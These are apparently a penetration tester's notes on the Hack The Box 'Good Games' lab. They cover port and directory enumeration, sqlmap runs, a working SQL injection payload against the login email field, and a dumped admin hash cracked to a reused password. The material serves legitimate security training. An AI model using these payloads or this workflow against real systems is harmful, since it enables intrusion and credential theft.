#HTB - Good Games
Keywords: #python #docker #weak-pwd

## Notes

_Current IP:_ 10.10.11.130

_Host Name:_ goodgames.htb  (added to /etc/hosts)

_current DB user_: 'main_admin@localhost'

_current DB user is DBA_: False

## To-Do
[ ] Determine where cracked login/password can be used
- does this provide any additional exposure/functions/features?

## Done
### Input Validation
[x] Check for input validation at [signup](http://goodgames.htb/signup)
- --data "email=*&name=*&password=*&password2=*"

[x] Check for input validation at [login](http://goodgames.htb/login)
- --data "email=\*&password=\*"  

[x] Check for input validation at [forgot-password](http://goodgames.htb/forgot-password)
- --data "Email=\*"  

[x] Check for input validation at [coming-soon](http://goodgames.htb/coming-soon)
- IGNORED - page performs a GET request to non-scoped server - "nkdev.us11.list-manage.com"

### Cracking
[x] Attempt to crack obtained hases from SQLi
- initial attempt with rockyou.txt; no clear-text passwords found.

## Findings

### SQLi 
- Host: http://goodgames.htb/login
- What: 'email' variable was not properly sanitized after POST request
```
sqlmap identified the following injection point(s) with a total of 173 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=' AND (SELECT 1612 FROM (SELECT(SLEEP(5)))OMJn) AND 'asXf'='asXf&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: email=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71716b7871,0x6556565a707445516e4f50797659665a524c546b464a4b48756462794871444b7955445079645357,0x7178716a71)-- -&password=
---
[12:35:25] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
```

### Password Hygiene
#### Easily cracked password
- Host: http://goodgames.htb/_  
```
Database: main
Table: user
+----+----------+---------------------+----------------------------------+--------------------+
| id | name     | email               | password                         | password           |
+----+----------+---------------------+----------------------------------+--------------------+
| 1  | admin    | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec | superadministrator |
+----+----------+---------------------+----------------------------------+--------------------+
```
#### Password Re-use
- Host: http://internal-administration.goodgames.htb
```
Database: main
Table: user
+----+----------+--------------------+
| id | name     | password           |
+----+----------+--------------------+
| 1  | admin    | superadministrator |
+----+----------+--------------------+
```

## Enumeration

### nmaps

```
$ sudo nmap -sS -sC -vv -p- -T4 -Pn -oA nmap-T4-all_tcp 10.129.15.202
Nmap scan report for 10.129.15.202
Host is up, received user-set (0.11s latency).
Scanned at 2022-11-16 13:17:48 EST for 226s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-title: GoodGames | Community and Store

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Nov 16 13:21:34 2022 -- 1 IP address (1 host up) scanned in 227.19 seconds
```

```
$ sudo nmap -sS -p 80 -sV 10.129.15.202              
[sudo] password for jimmi: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 13:34 EST
Nmap scan report for 10.129.15.202
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
Service Info: Host: goodgames.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds
```
### Versions

- [Apache httpd 2.4.51](https://packages.ubuntu.com/search?suite=default&section=all&arch=any&keywords=apache2&searchon=names) - Impish (21.10) or prior?
- JavaScript frameworks - GSAP 1.20.3
- Web frameworks - Flask 2.0.2
- Web servers - Flask 2.0.2
- Programming languages - Python 3.9.2
- JavaScript libraries:
  - Hammer.js 2.0.7
  - jQuery 3.3.1
  - Moment.js 2.22.1

### gobusting

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://goodgames.htb -s '200,204,301,302,307,403,500' -b '' --exclude-length 9265 -e | tee gobuster-common.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://goodgames.htb
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:     302,307,403,500,200,204,301
[+] Exclude Length:   9265
[+] User Agent:       gobuster/3.3
[+] Expanded:         true
[+] Timeout:          10s
===============================================================
2022/11/16 14:19:03 Starting gobuster in directory enumeration mode
===============================================================
http://goodgames.htb/blog                 (Status: 200) [Size: 44212]
http://goodgames.htb/forgot-password      (Status: 200) [Size: 32744]
http://goodgames.htb/login                (Status: 200) [Size: 9294]
http://goodgames.htb/logout               (Status: 302) [Size: 208] [--> http://goodgames.htb/]
http://goodgames.htb/profile              (Status: 200) [Size: 9267]
http://goodgames.htb/server-status        (Status: 403) [Size: 278]
http://goodgames.htb/signup               (Status: 200) [Size: 33387]
===============================================================
2022/11/16 14:20:03 Finished
===============================================================

$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u http://goodgames.htb -s '200,204,301,307,403,500' -b '' --exclude-length 9265 --exclude-length 85107 -e | tee gobuster-cgis.txt                                                                                                                 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://goodgames.htb
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/CGIs.txt
[+] Status codes:     301,307,403,500,200,204
[+] Exclude Length:   9265,85107
[+] User Agent:       gobuster/3.3
[+] Expanded:         true
[+] Timeout:          10s
===============================================================
2022/11/16 14:31:07 Starting gobuster in directory enumeration mode
===============================================================
Progress: 168 / 3389 (4.96%)[ERROR] 2022/11/16 14:31:10 [!] parse "http://goodgames.htb/%NETHOOD%/": invalid URL escape "%NE"
Progress: 446 / 3389 (13.16%)[ERROR] 2022/11/16 14:31:13 [!] parse "http://goodgames.htb/%a%s%p%d": invalid URL escape "%a%"
Progress: 489 / 3389 (14.43%)[ERROR] 2022/11/16 14:31:14 [!] parse "http://goodgames.htb/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%": invalid URL escape "%"
http://goodgames.htb/server-status        (Status: 403) [Size: 278]
===============================================================
2022/11/16 14:31:50 Finished
===============================================================

$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://goodgames.htb -s '200,204,301,302,307,403,500' -b '' --exclude-length 9265 -e -x py,js,txt | tee gobuster-dirlist_med.txt 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://goodgames.htb
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Status codes:     403,500,200,204,301,302,307
[+] Exclude Length:   9265
[+] User Agent:       gobuster/3.3
[+] Extensions:       js,txt,py
[+] Expanded:         true
[+] Timeout:          10s
===============================================================
2022/11/16 14:49:04 Starting gobuster in directory enumeration mode
===============================================================
http://goodgames.htb/blog                 (Status: 200) [Size: 44212]
http://goodgames.htb/login                (Status: 200) [Size: 9294]
http://goodgames.htb/profile              (Status: 200) [Size: 9267]
http://goodgames.htb/signup               (Status: 200) [Size: 33387]
http://goodgames.htb/logout               (Status: 302) [Size: 208] [--> http://goodgames.htb/]
Progress: 19750 / 830576 (2.37%)
```

### feroxbusting

```
$ feroxbuster --url http://goodgames.htb --extract-links | tee -a feroxbuster-common.txt                                                                    
                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___                                                                                                           
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                            
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                           
by Ben "epi" Risher 🤓                 ver: 2.7.1                                                                                                            
───────────────────────────┬──────────────────────                                                                                                           
 🎯  Target Url            │ http://goodgames.htb                                                                                                            
 🚀  Threads               │ 50                                                                                                                              
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt                                                           
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                              
 💥  Timeout (secs)        │ 7                                                                                                                               
 🦡  User-Agent            │ feroxbuster/2.7.1                                                                                                               
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                              
 🔎  Extract Links         │ true                                                                                                                            
 🏁  HTTP methods          │ [GET]                                                                                                                           
 🔃  Recursion Depth       │ 4                                                                                                                               
───────────────────────────┴──────────────────────                                                                                                           
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                          
────────────────────────────────────────────────── 
WLD      GET      267l      548w     9265c Got 200 for http://goodgames.htb/055787014c944bb0953049f95b92f530 (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 9265 responses; toggle this behavior by using --dont-filter
302      GET        4l       24w      208c http://goodgames.htb/logout => http://goodgames.htb/
200      GET       22l      253w     5339c http://goodgames.htb/static/vendor/jquery-countdown/dist/jquery.countdown.min.js
200      GET       17l       56w     3026c http://goodgames.htb/static/images/logo-2.png
200      GET      180l     1181w    69420c http://goodgames.htb/static/images/gallery-1-thumb.jpg
200      GET      426l     2868w   151738c http://goodgames.htb/static/images/post-1-mid.jpg
200      GET       77l       68w     2629c http://goodgames.htb/static/images/team-2.jpg
200      GET      446l     1587w    68927c http://goodgames.htb/static/images/bg-fixed-2.jpg
200      GET      267l      553w     9294c http://goodgames.htb/login
200      GET      248l     1594w    80265c http://goodgames.htb/static/images/post-2-mid.jpg
200      GET        5l      311w    34820c http://goodgames.htb/static/vendor/bootstrap-slider/dist/bootstrap-slider.min.js
200      GET      267l      545w     9267c http://goodgames.htb/profile
200      GET        7l      171w    15998c http://goodgames.htb/static/vendor/jarallax/dist/jarallax-video.min.js
200      GET      212l     1403w    83309c http://goodgames.htb/static/images/gallery-4-thumb.jpg
200      GET      752l     4077w   202135c http://goodgames.htb/static/images/bg-bottom.png
200      GET     1380l     8354w   429442c http://goodgames.htb/static/images/bg-top-3.png
200      GET      644l     4141w   216657c http://goodgames.htb/static/images/post-7-mid-square.jpg
200      GET       17l      125w     8229c http://goodgames.htb/static/images/avatar-1.jpg
200      GET       17l      125w     8229c http://goodgames.htb/static/images/avatar-2.jpg
200      GET      151l      524w    23619c http://goodgames.htb/static/images/product-14-xs.jpg
200      GET       98l      529w    31154c http://goodgames.htb/static/images/post-2-sm.jpg
200      GET        4l       76w     9878c http://goodgames.htb/static/vendor/photoswipe/dist/photoswipe-ui-default.min.js
200      GET        7l       39w     1895c http://goodgames.htb/static/images/team-3.jpg
200      GET      458l     2083w    97102c http://goodgames.htb/static/images/post-4-mid.jpg
200      GET      103l      665w    40081c http://goodgames.htb/static/images/product-12-xs.jpg
200      GET      728l     2070w    33387c http://goodgames.htb/signup
200      GET        7l      110w     5594c http://goodgames.htb/static/vendor/imagesloaded/imagesloaded.pkgd.min.js
200      GET      381l     3180w   173589c http://goodgames.htb/static/images/post-3-mid.jpg
200      GET      909l     2572w    44212c http://goodgames.htb/blog
200      GET      129l      442w    20613c http://goodgames.htb/static/images/product-1-xs.jpg
200      GET      287l      620w    10524c http://goodgames.htb/coming-soon
200      GET       89l      882w    45191c http://goodgames.htb/static/images/post-5-sm.jpg
200      GET      165l      426w     6235c http://goodgames.htb/static/plugins/nk-share/nk-share.js
200      GET      255l     1415w    72319c http://goodgames.htb/static/images/gallery-3-thumb.jpg
200      GET      629l     3599w   163885c http://goodgames.htb/static/images/post-1-fw.jpg
200      GET      730l     2069w    32744c http://goodgames.htb/forgot-password
200      GET      816l     4680w   220089c http://goodgames.htb/static/images/slide-1.jpg
200      GET       17l     1147w   114925c http://goodgames.htb/static/vendor/gsap/src/minified/TweenMax.min.js
200      GET       67l      410w    25217c http://goodgames.htb/static/images/post-6-sm.jpg
200      GET       90l      449w    24397c http://goodgames.htb/static/images/post-1-sm.jpg
200      GET        7l      572w    50731c http://goodgames.htb/static/vendor/bootstrap/dist/js/bootstrap.min.js
200      GET      663l     1856w    31374c http://goodgames.htb/blog/1
200      GET     9754l    19468w   205778c http://goodgames.htb/static/css/goodgames.css
200      GET      374l     2147w    96557c http://goodgames.htb/static/images/gallery-3.jpg
200      GET        7l      324w    20765c http://goodgames.htb/static/vendor/hammerjs/hammer.min.js
200      GET      291l     1655w    91870c http://goodgames.htb/static/images/post-7-fw.jpg
200      GET        5l       14w      823c http://goodgames.htb/static/images/icon-mouse.png
200      GET       84l      456w    37028c http://goodgames.htb/static/vendor/soundmanager2/script/soundmanager2-nodebug-jsmin.js
200      GET      661l     4055w   202100c http://goodgames.htb/static/images/post-2-fw.jpg
200      GET      157l      601w    22864c http://goodgames.htb/static/images/product-3-xs.jpg
200      GET      482l     1238w    11607c http://goodgames.htb/static/vendor/photoswipe/dist/default-skin/default-skin.css
200      GET     1142l     6566w   300869c http://goodgames.htb/static/images/post-6-fw.jpg
200      GET        1l      383w    17676c http://goodgames.htb/static/vendor/summernote/dist/summernote-bs4.css
200      GET     2197l     9609w   490998c http://goodgames.htb/static/images/bg-top.png
200      GET      115l      621w    35225c http://goodgames.htb/static/images/product-11-xs.jpg
200      GET      765l     4456w   189168c http://goodgames.htb/static/images/gallery-6.jpg
200      GET      818l     3942w   166525c http://goodgames.htb/static/images/post-4.jpg
200      GET      141l      494w     6179c http://goodgames.htb/static/js/goodgames-init.js
200      GET       22l       88w     3964c http://goodgames.htb/static/images/slide-3-thumb.jpg
200      GET     1566l     7938w   315834c http://goodgames.htb/static/images/post-2.jpg
200      GET       17l      125w     8229c http://goodgames.htb/static/images/avatar-3.jpg
200      GET      605l     3573w   183421c http://goodgames.htb/static/images/post-8-mid.jpg
200      GET        7l     1608w   140930c http://goodgames.htb/static/vendor/bootstrap/dist/css/bootstrap.min.css
200      GET        7l       21w     1110c http://goodgames.htb/static/images/icon-gamepad.png
200      GET      274l     1540w    74926c http://goodgames.htb/static/images/post-4-mid-square.jpg
200      GET        6l       32w     1410c http://goodgames.htb/static/images/favicon.png
200      GET       13l      670w    55241c http://goodgames.htb/static/vendor/flickity/dist/flickity.pkgd.min.js
200      GET     1219l     7066w   315007c http://goodgames.htb/static/images/post-3-fw.jpg
200      GET       12l       80w     3454c http://goodgames.htb/static/vendor/gsap/src/minified/plugins/ScrollToPlugin.min.js
200      GET       70l      477w    26415c http://goodgames.htb/static/images/post-4-sm.jpg
403      GET        9l       28w      278c http://goodgames.htb/server-status
200      GET      286l     1213w    51804c http://goodgames.htb/static/images/gallery-2-thumb.jpg
200      GET      317l     1775w    77064c http://goodgames.htb/static/images/post-3-mid-square.jpg
200      GET       87l      621w    36811c http://goodgames.htb/static/images/product-13-xs.jpg
200      GET      205l     1195w    58233c http://goodgames.htb/static/images/gallery-5.jpg
200      GET      235l     1287w    65395c http://goodgames.htb/static/images/slide-2.jpg
200      GET      370l     2341w   115513c http://goodgames.htb/static/images/post-3.jpg
200      GET      365l     2207w    98221c http://goodgames.htb/static/images/slide-3.jpg
200      GET     1396l     8153w   346682c http://goodgames.htb/static/images/slide-4.jpg
200      GET      205l     1308w    77076c http://goodgames.htb/static/images/gallery-6-thumb.jpg
200      GET        3l     1446w   118619c http://goodgames.htb/static/vendor/summernote/dist/summernote-bs4.min.js
200      GET        2l     1283w    86927c http://goodgames.htb/static/vendor/jquery/dist/jquery.min.js
200      GET      284l     1961w    86504c http://goodgames.htb/static/images/post-5.jpg
200      GET        6l       19w      998c http://goodgames.htb/static/images/icon-gamepad-2.png
200      GET      226l     1258w    52279c http://goodgames.htb/static/images/gallery-4.jpg
200      GET      164l     1059w    46580c http://goodgames.htb/static/images/post-5-mid-square.jpg
200      GET        7l      258w    14848c http://goodgames.htb/static/vendor/jarallax/dist/jarallax.min.js
200      GET       11l       46w    51284c http://goodgames.htb/static/vendor/ionicons/css/ionicons.min.css
200      GET        5l    60950w   672646c http://goodgames.htb/static/vendor/fontawesome-free/js/all.js
200      GET      976l     2368w    26329c http://goodgames.htb/static/vendor/nanoscroller/bin/javascripts/jquery.nanoscroller.js
200      GET       31l      138w     6244c http://goodgames.htb/static/images/slide-2-thumb.jpg
200      GET        1l    27694w   184339c http://goodgames.htb/static/vendor/moment-timezone/builds/moment-timezone-with-data.min.js
200      GET        5l      363w    20337c http://goodgames.htb/static/vendor/popper.js/dist/umd/popper.min.js
200      GET      131l      368w    16301c http://goodgames.htb/static/images/product-2-xs.jpg
200      GET      789l     4594w   212918c http://goodgames.htb/static/images/post-6.jpg
200      GET       16l       83w     3948c http://goodgames.htb/static/images/slide-5-thumb.jpg
200      GET      362l     2687w   142364c http://goodgames.htb/static/images/post-9-mid-square.jpg
200      GET       32l      153w     7741c http://goodgames.htb/static/images/slide-1-thumb.jpg
200      GET        4l       18w      912c http://goodgames.htb/static/images/logo.png
200      GET        2l       47w     3285c http://goodgames.htb/static/vendor/object-fit-images/dist/ofi.min.js
200      GET      455l     3107w   177877c http://goodgames.htb/static/images/post-6-mid.jpg
200      GET      311l     2258w   115541c http://goodgames.htb/static/images/gallery-1.jpg
200      GET       11l      865w    51627c http://goodgames.htb/static/js/goodgames.min.js
200      GET     1071l     6286w   261415c http://goodgames.htb/static/images/post-5-fw.jpg
200      GET        4l       20w     1821c http://goodgames.htb/static/vendor/flickity/dist/flickity.min.css
200      GET      179l      495w     4137c http://goodgames.htb/static/vendor/photoswipe/dist/photoswipe.css
200      GET      818l     4319w   189605c http://goodgames.htb/static/images/gallery-2.jpg
200      GET       10l       39w     3278c http://goodgames.htb/static/vendor/sticky-kit/dist/sticky-kit.min.js
200      GET      190l     1218w    63740c http://goodgames.htb/static/images/post-1.jpg
200      GET      472l     2603w   105918c http://goodgames.htb/static/images/slide-5.jpg
200      GET        4l      287w    31903c http://goodgames.htb/static/vendor/photoswipe/dist/photoswipe.min.js
200      GET        5l       43w    15185c http://goodgames.htb/static/vendor/fontawesome-free/js/v4-shims.js
200      GET        1l        9w       43c http://goodgames.htb/static/css/custom.css
200      GET      466l     3396w   184492c http://goodgames.htb/static/images/post-5-mid.jpg
200      GET       40l      331w    20071c http://goodgames.htb/static/images/post-3-sm.jpg
200      GET       15l       49w     1988c http://goodgames.htb/static/images/team-4.jpg
200      GET       10l       46w     2051c http://goodgames.htb/static/images/team-1.jpg
200      GET       41l      397w     9248c http://goodgames.htb/static/vendor/bootstrap-slider/dist/css/bootstrap-slider.min.css
200      GET      182l     1473w   101378c http://goodgames.htb/static/images/gallery-5-thumb.jpg
200      GET        1l      935w    51638c http://goodgames.htb/static/vendor/moment/min/moment.min.js
200      GET        4l      401w    23261c http://goodgames.htb/static/vendor/jquery-validation/dist/jquery.validate.min.js
200      GET       23l      103w     4994c http://goodgames.htb/static/images/slide-4-thumb.jpg
200      GET      450l     2771w   151697c http://goodgames.htb/static/images/post-7-mid.jpg
200      GET     1735l     5548w    85107c http://goodgames.htb/
200      GET      383l     1317w    43100c http://goodgames.htb/static/images/bg-fixed-1.jpg
200      GET      267l      553w     9294c http://goodgames.htb/password-reset

```

### gobuster
```
[ 12:49PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data ]                                                                                                                       
 $ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.130/FUZZ -fs 9265 -c -v | tee ffuf-raft_med_low.txt                          
                                                                                                                                                                                     
        /'___\  /'___\           /'___\                                                                                                                                              
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                              
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                             
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                             
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                              
          \/_/    \/_/   \/___/    \/_/                                                                                                                                              
                                                                                                                                                                                     
       v1.5.0 Kali Exclusive <3                                                                                                                                                      
________________________________________________                                                                                                                                     

 :: Method           : GET
 :: URL              : http://10.10.11.130/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 9265
________________________________________________

[Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 91ms]
| URL | http://10.10.11.130/logout
| --> | http://10.10.11.130/
    * FUZZ: logout

[Status: 200, Size: 44212, Words: 15590, Lines: 909, Duration: 54ms]
| URL | http://10.10.11.130/blog
    * FUZZ: blog

[Status: 200, Size: 9294, Words: 2101, Lines: 267, Duration: 87ms]
| URL | http://10.10.11.130/login
    * FUZZ: login

[Status: 200, Size: 9267, Words: 2093, Lines: 267, Duration: 453ms]
| URL | http://10.10.11.130/profile
    * FUZZ: profile

[Status: 200, Size: 33387, Words: 11042, Lines: 728, Duration: 113ms]
| URL | http://10.10.11.130/signup
    * FUZZ: signup

[Status: 200, Size: 85107, Words: 29274, Lines: 1735, Duration: 114ms]
| URL | http://10.10.11.130/.
    * FUZZ: .

[Status: 200, Size: 32744, Words: 10608, Lines: 730, Duration: 60ms]
| URL | http://10.10.11.130/forgot-password
    * FUZZ: forgot-password

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 37ms]
| URL | http://10.10.11.130/server-status
    * FUZZ: server-status

[Status: 200, Size: 10524, Words: 2489, Lines: 287, Duration: 133ms]
| URL | http://10.10.11.130/coming-soon
    * FUZZ: coming-soon

[Status: 200, Size: 9294, Words: 2101, Lines: 267, Duration: 121ms]
| URL | http://10.10.11.130/password-reset
    * FUZZ: password-reset

:: Progress: [56293/56293] :: Job [1/1] :: 179 req/sec :: Duration: [0:03:33] :: Errors: 0 ::
```

### Registration

During manual browsing with burp, entered details into [registration form](http://10.10.11.130/signup)

**email**: register@form.com
**first**: Register
**pwd**: Password123!

Upon attempting to resend the same data, it was noted that **Account already exists!**

### Input Validation

#### **sqlmap**

**forgot-password**

```
[ 12:17PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data ]
 $ sqlmap -u "http://goodgames.htb/forgot-password" --data "Email=*"        
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:18:23 /2022-12-22/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[12:18:28] [INFO] testing connection to the target URL
[12:18:28] [INFO] testing if the target URL content is stable
[12:18:28] [INFO] target URL content is stable
[12:18:28] [INFO] testing if (custom) POST parameter '#1*' is dynamic
[12:18:29] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
[12:18:29] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#1*' might not be injectable
[12:18:29] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
[12:18:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:18:29] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:18:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:18:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:18:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:18:30] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:18:30] [INFO] testing 'Generic inline queries'
[12:18:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:18:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:18:31] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:18:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:18:32] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:18:32] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:18:32] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[12:18:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:18:42] [WARNING] (custom) POST parameter '#1*' does not seem to be injectable
[12:18:42] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 12:18:42 /2022-12-22/
```
**signup**
```
[  1:03PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data ]                                                                                                                       
 $ sqlmap -u "http://goodgames.htb/signup" --data "email=*&name=*&password=*&password2=*"                                                                                            
        ___                                                                                                                                                                          
       __H__                                                                                                                                                                         
 ___ ___[,]_____ ___ ___  {1.6.12#stable}                                                                                                                                            
|_ -| . [,]     | .'| . |                                                                                                                                                            
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                                                                         
                                                                                                                                                                                     
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and fede
ral laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                                     
                                                                                                                                                                                     
[*] starting @ 13:04:24 /2022-12-22/                                                                                                                                                 
                                                                                                                                                                                     
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y                                                                                               
[13:04:27] [INFO] testing connection to the target URL                                                                                                                               
[13:04:28] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                                                        
[13:04:28] [INFO] testing if the target URL content is stable                                                                                                                        
[13:04:28] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are
 detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'                                                                                            
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C                                                                                                                   
[13:04:42] [INFO] testing if (custom) POST parameter '#1*' is dynamic                                                                                                                
[13:04:43] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic                                                                                                     
[13:04:43] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#1*' might not be injectable                                                                         
[13:04:43] [INFO] testing for SQL injection on (custom) POST parameter '#1*'                                                                                                         
[13:04:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                                                         
[13:04:44] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                                                 
[13:04:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                 
[13:04:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                                                                      
[13:04:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                                
[13:04:46] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                                                
[13:04:46] [INFO] testing 'Generic inline queries'                                                                                                                                   
[13:04:46] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                                                                               
[13:04:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                                                                    
[13:04:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                                             
[13:04:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                                                       
[13:04:47] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'                                                                                                                    
[13:04:47] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'                                                                                                        
[13:04:48] [INFO] testing 'Oracle AND time-based blind'                                                                                                                              
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y            
[13:04:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'                                                                                                             
[13:04:54] [WARNING] (custom) POST parameter '#1*' does not seem to be injectable                                                                                                    
[13:04:54] [INFO] testing if (custom) POST parameter '#2*' is dynamic                                                                                                                
[13:04:54] [WARNING] (custom) POST parameter '#2*' does not appear to be dynamic                                                                                                     
[13:04:55] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#2*' might not be injectable
[13:04:55] [INFO] testing for SQL injection on (custom) POST parameter '#2*'                                                                                                         
[13:04:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:04:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:04:56] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:04:56] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:04:56] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:04:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:04:57] [INFO] testing 'Generic inline queries'
[13:04:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:04:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
